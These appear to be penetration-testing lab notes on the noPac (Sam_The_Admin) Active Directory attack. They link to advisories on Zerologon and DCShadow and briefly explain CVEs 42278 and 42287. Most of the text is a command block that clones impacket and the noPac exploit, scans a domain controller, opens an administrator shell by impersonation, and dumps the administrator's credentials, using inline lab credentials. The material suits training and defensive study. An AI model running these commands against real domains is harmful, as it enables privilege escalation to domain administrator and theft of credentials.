[Zerologon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/)
[DCShadow](https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/)
[Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699)
* `42278` - is a bypass vulnerability with the Security Account Manager (SAM).
* `42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.
```python
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

git clone https://github.com/Ridter/noPac.git

sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```